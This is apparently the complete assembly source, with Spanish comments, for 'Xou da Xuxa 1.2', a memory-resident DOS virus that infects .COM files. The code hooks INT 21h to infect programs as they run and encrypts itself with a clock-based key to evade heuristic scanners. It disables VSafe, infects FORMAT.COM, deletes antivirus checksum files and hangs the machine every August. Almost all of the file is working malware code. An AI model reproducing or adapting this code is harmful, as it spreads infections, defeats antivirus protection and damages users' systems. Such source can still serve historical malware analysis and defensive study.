

;XOU DA XUXA 1.2
;El Xou da Xuxa 1.2 es un virus residente infector de com, se encripta con un
;ror(constante), y un xor, tomando el numero para el xor del reloj. El mes 8 
;muestra un mensaje en pantalla y hace un print sceen.
;Evade al TB en heuristico alto.
;Escrito por Leviathan.
.286
codigo  segment 'code'
	assume cs:codigo,ds:codigo,es:codigo
	org 100h
start	proc far
VirLong		equ	offset end_vir - offset inicio		
Virenc		equ	offset end_vir - offset inicio_enc

inicio:

;Calcular el offset delta evadiendo al heuristico.

	call	offset_beta			
offset_beta:					
	mov	di, sp				
	mov	bp, word ptr ss:[di]		
	sub	bp, offset offset_beta		
 	add	sp, 2				

	jmp	inicio2				
cont_gen	db	'00'			
valor_enc	db	1			

;Desencripta si no es la primera ves que se corre.
;La salida al dos que hay en el medio de la rutina de desencripcion es para
;evador al heuristico.

INICIO2:
	cmp	word ptr [cont_gen+bp],'00'	
	je	inicio_enc			
	lea	si, cs:[inicio_enc+bp]		
	lea	di, cs:[inicio_enc+bp]		
	mov	cx, virenc			
desencripta:
	mov	dl, byte ptr cs:[valor_enc+bp]	
	mov	al, ds:[si]			
	xor	al, dl

	jmp 	no_sale_nunca				
	mov	ah, 4ch
	int 	21h
no_sale_nunca:

	rol	al, 5d				
	mov	es:[di], al			
	inc	si				
	inc	di				
	dec	cx				
	jnz 	desencripta			
	jmp	inicio_enc			

;Desde aca de encripta.

inicio_enc:
jmp	comprobar_res
mensaje		db	'Si no viste el Show de Xuxa por T.V, ni en vivo...'
		db	'                              '
		db	'ahora podes verlo en tu PC!.  -  '
		db	'XOU DA XUXA 1.2                                '
		db	'By Leviathan.$'
jump		db	'é00'
primeros_bytes 		db	3 dup(0)
fecha		db 	1
primer		db	'C:\DOS\FORMAT.COM',0
int21	        dd 	1 
chklist		db	'CHKLIST.MS',0
anti		db	'ANTI-VIR.DAT',0
command		db	'COMMAND.COM',0
int24	        dd 	1
directorio	db	65d dup(0)
vsafe_estado	db 	1
comprobar_res:

;Desactiva el Vsafe mientras el virus se instala y guarda
;los flags en memoria

	xor	bl, bl
	call	vsafe
	mov	byte ptr cs:[vsafe_estado+bp], cl


;Comprobar si ya etsa em memoria

	mov   	ax,354Bh			
	int   	21h				
	cmp 	bx, 9d				
	jne     a				
	jmp 	ejecutar_anfitrion		
a:						

;Incrementa el contador de generaciones y si
;llega a 99 lo vuelve a 1.

	add	word ptr cs:[cont_gen+bp], 1	
	cmp	word ptr cs:[cont_gen+bp], 99	
	jnb	poner_a_cero			
	jmp	continuar			
poner_a_cero:						
	mov	word ptr cs:[cont_gen+bp],'10'	

;Obtiene el vector de la 21h
continuar:
	mov 	ax,3521h
	int	 21h 	       		    	
	mov	 word ptr cs:[int21+BP],bx	
	mov	 word ptr cs:[int21+2+BP],es	

;Metodo de MCB, deveuelve en ES el segmento donde se copiara el virus.

	mov 	bx, 169d 		        
	mov 	ax,cs				
	dec 	ax				
	mov 	es,ax				
	mov 	ax,es:[3]			
	push 	bx				
	inc 	bx				
	sub	ax,bx				
	mov 	bx,ax				
	push 	cs				
	pop 	es				
	mov 	ax,4a00h      			
	int 	21h            			
	pop 	bx				
	mov 	ax,4800h     			
	int 	21h           			
	dec 	ax				
	mov 	es,ax         			
	mov 	word ptr es:[1],8		
	inc 	ax				
	mov 	es,ax				
	lea 	cx, cs:[end_vir+BP]		
	lea 	bx, cs:[inicio+bp]		
	sub 	cx, bx                       	
	mov 	di,100h			
	lea 	si,cs:[inicio+bp]		
	rep 	movsb				

;Marco recidencia

	mov ax, 254Bh 			
	mov dx, 6d			
	int 21h                 	

;Actualiza el vector de la int 21 a  es:compara 

	mov ax,2521h			
	lea dx, cs:compara 		
	Push es               		
	pop ds      			
	int 21h     			

;Infectar el format.com en la instalacion

	mov	ax, 4b03h		
	push	cs			
	pop	ds			
	lea	dx, cs:[primer+bp]	
	int	21h			

	mov ax, 254Bh			
	mov dx, 9d			
	int 21h 			

;Restaura el Vsafe a su estado original 

	mov	bl, byte ptr cs:[vsafe_estado+bp]
	call	vsafe

	jmp 	ejecutar_anfitrion
				

;Entrada de la int 21h

compara:
	pushf					
	cmp	ah, 4bh				
	je	yes				

	popf					
	jmp	cs:[int21]			
						
yes:
	push	ax
	push	ds
	push	dx
	push	es
	push	bx

	push	dx
	push	ds

	push	dx
;Obtiene la fecha, para ejecutar
;el playload

	mov	ah, 2ah		
	int	21h		
	cmp	dh, 8		
	jne	noXuxa		
	jmp	Xuxa
noXuxa:
	pop	dx

;Comprobar command.com , para no infectar.
;Busca el fin de la cadena asciiz, luego retrocede 11 lugares
;y comprara la cadena que hay desde esa posicion con command.com.


	mov	si, dx				
	push	cs				
	pop	es				
	mov	cx, 65d				
;Busca el fin de la cadena ASCIIZ
lo:						
	mov	al ,ds:[si]			
	cmp	al, 0				
	je	fin_cadena			
	inc	si				
	dec	cx				
	jnz	lo				
	jmp	no_e				

fin_cadena:					
	mov	cx,11d				
	lea	di, command			
	sub	si, 11d				
						
	rep	cmpsb				
	jne	no_e				
	pop	ax				
	pop	ax				
	jmp 	es_command			
no_e:
;Saco el vsafe 

	xor	bl, bl
	call	vsafe
	mov	byte ptr cs:[vsafe_estado], cl

;Obtengo vector del la  int 24 

	mov 	ax,3524h
	int 	21h 	    
	push	cs
	pop	ds   
	mov 	word ptr cs:[int24],bx 
	mov 	word ptr cs:[int24+2],es

;Seteo nueva int 24

	mov 	ax,2524h				
	Lea 	dx, int_24		                
	int 	21h                 			
	pop	ds					

;Guardo los atributos de file y los remplazo por el de archivo 

yes2:
	pop	dx					
	push	ds					
	push	dx					
	call	atri					
	jnc	existe					
							
	pop	ax					
	pop	ax					
	jmp	primer_no				
existe:	
	push	cx					

;Abrir file 

	mov	ah,3dh
	mov	al, 00000010b				
	int	21h					
							
	mov	bx, ax					

;Guardo la fecha del file 

	mov	ax, 5700h
	int	21h
	push	cx			
	push	dx			

;Comprueba si el file estaba ya apestado, comparando
;los segundos del file.

	and 	ch, 11110000b		
	cmp	ch, 10100000b		
	jne	b			
	jmp	prepara_cerrar		
b:	

;Lee los 3 primeros bytes 

	push 	cs 	
	pop	ds 	
	mov	ah, 3fh	
	mov	cx, 3d	
	lea 	dx, primeros_bytes
	int	21h		

;Compara MZ 

	cmp	word ptr primeros_bytes, 'ZM'
	jne	es_com			
	jmp	prepara_cerrar		

;Obtener lomngitud del file, queda en AX

es_com:
	mov	al, 02h					
	call	mover_puntero				
	sub	ax, 3				
	
;Compara lo longitud, con la maxima posible para infectar 

    	cmp	ax, 62000d			
    	jna	es_menor			
	jmp	prepara_cerrar
es_menor:		
	cmp	ax, 300d
	ja	long_correcta			
	jmp	prepara_cerrar			
long_correcta:

;Paso la longitus a la variable JUMP+1

	mov	word ptr [jump+1], ax		

;Obtener los segundos del sistema, para tener un valor con que encriptar

	mov	ah, 2ch
	int	21h
	xor	dh, dh
	mov	byte ptr cs:valor_enc, dl	

;Copia a memoria a partir del fin del virus, la parte del  virus que no se

;encripta.
	push	bx
	push	cs
	push	cs
	pop	ds
	pop	es
	lea	si, inicio			
	lea	di, [end_vir+1]	
	mov	cx, virlong - virenc		
	rep 	movsb

;Encripta el resto del virus

c:
	mov	dl, byte ptr valor_enc
	mov	cx, virenc	
encripta:
	mov	al, ds:[si]
	ror	al, 5d		
	xor	al, dl		
	mov	es:[di], al
	inc	si
	inc	di
	dec	cx
	jnz 	encripta
	pop	bx

;Escrivo el virus en el file

	mov	ah, 40h			
	mov	cx, virlong		
	lea	dx, [end_vir+1] 	
	int 	21h			

;Retrocedo el puntero al principio 

	mov	al, 00h			
	call	mover_puntero		

;Escrivo eu JMP al principio para transferir control al virus 

	mov	ah, 40h				
	mov	cx, 3d				
	lea	dx, jump			
	int 	21h				

;Restauro la hora original 
;Marco al file como infectado cambiando los segundos a 0101.
;Salvo CL y luego paso el nibble bajo de ch a cl, pongo en ch a 0000101 y
;despues roto CX para que quede el ch 0101???? y restayro CL, y queda la fecha
; y hora original con los segundos cambiados.
	pop	dx		
	pop	cx				
	mov	byte ptr fecha, cl		
	shr	cx, 4				
	mov	ch, 000001010b			
	shl	cx, 4				
	mov	cl, byte ptr fecha		
	
	mov	ax, 5701h			
	int	21h				

;Borrar los chklist.ms y anti_vir.dat

	pop	cx				
	pop	dx				
	pop	ds				
	push	ds				
	push	dx				
	push	cx				
	push	bx				

;Copio el string a la variable directorio 

	mov	si, dx			
	lea	di, directorio		
lop:	mov	al, ds:[si]		
	mov	es:[di], al		
	cmp	al, 0			
					
	je	cambia_final		
	inc	si			
	inc	di			
	jmp	lop			

;Cambio el nombre del file por el del file a borrar

cambia_final:
	push	cs		
	pop	ds		

	mov	bx, 1		
lop2:
	dec	di		
	mov	al, ds:[di]	
	cmp	al, '\'		
	jne	lop2		
				
	inc	di		
	cmp	bx, 2		
	je	antiv		
				
	lea	si, chklist	
	jmp	chk		
antiv:	lea	si, anti	
chk:	mov	cx, 13		
	rep	movsb		
				
;Cambio los atri al file a borrar

	lea	dx, directorio
	mov	cx, 00h	
	stc		
	call	atri	

;Lo borro

	mov	ah,41h
	int	21H
	cmp	bx, 2	
	je	bye	
	mov	bx, 2	
	jmp	lop2	
bye:	pop	bx	
	jmp	cerrar	
prepara_cerrar:

;Equilibrar la pila si el programa estaba ya infectado

	pop	ax
	pop	ax

;Cierro el file 

CERRAR:
	mov	ah, 3eh
	int	21h

;Restauto los atributos 

	pop	cx	
	pop	dx	
	pop	ds	
	stc		
	call	atri	

;Restauro la int 24h original 

	mov 	ax, 2524h
	push	cs
	pop	ds
	mov	dx, word ptr cs:[int24]
	mov	ds, word ptr cs:[int24+2]
	int 21h
primer_no:

;Comprobar si es la instalacion

	mov     ax,354Bh	
	int   	21h	
	cmp 	bx, 6d	
	jne	es_command		

;Restaura el Vsafe a su estado original 

	mov	bl, byte ptr cs:[vsafe_estado]
	call	vsafe

	pop	bx
	pop	es
	pop	dx
	pop	ds
	pop	ax
	popf
	iret

;Continuar con int 21h

es_command:

;Restaura el Vsafe a su estado original

	push	cs
	pop	ds
	mov	bl, byte ptr vsafe_estado
	call	vsafe

	pop	bx
	pop	es
	pop	dx 
	pop	ds
	pop	ax
	popf
	jmp	cs:[int21]			;Salta a int 21 orig.

;Ejecutar anfitrion cuando el virus esta residente 

ejecutar_anfitrion:
	mov	bl, byte ptr cs:[vsafe_estado+bp]
	call	vsafe

	push	cs
	push	cs
	pop	ds
	pop	es
	mov	cx, 3d
	lea	si, [primeros_bytes+bp]
	mov	di, 0100h
	rep	movsb
	mov	ax, 0100h
	jmp 	ax
;*************************************INT 24 *********************************
int_24:
	mov	ah, 00h
	iret
;*******************************PROCEDIMIENTOS*********************************
mover_puntero	proc
;Entra AL para mover desde el comienzo o final.
	mov	ah, 42h	
	mov	cx, 0h	
	mov	dx, 0h	
	int	21H					
	ret						
mover_puntero	endp

atri	proc
;Entrada: DS:DX apuntando a la cadena ASCIIZ y carry, salida: en CX los 
;atributos originales.  Deja el file con atributo de archivo. O solo
;setea sin guardar(carry on).
	jc	ya_tengo_cx
	mov	ax, 4300h
	int	21h
	push	cx	
	mov	cx, 00h	
	jmp	todo
ya_tengo_cx:
	push	cx
todo:	mov	ax, 4301h
	int 	21h
	pop	cx
	ret
atri	endp

vsafe	proc
;Recive atributos en BL y devuelve los anteriores en CL
	mov	ax, 0FA02h
	mov	dx, 5945h
	int	21h
	ret
vsafe	endp

;Muestra mensaje y para la maquina
Xuxa:
	mov 	ah, 9
	lea	dx, cs:mensaje
	int	21h
	int 	5h
ataque:	jmp	ataque

end_vir:
start	endp
codigo  ends
end     inicio

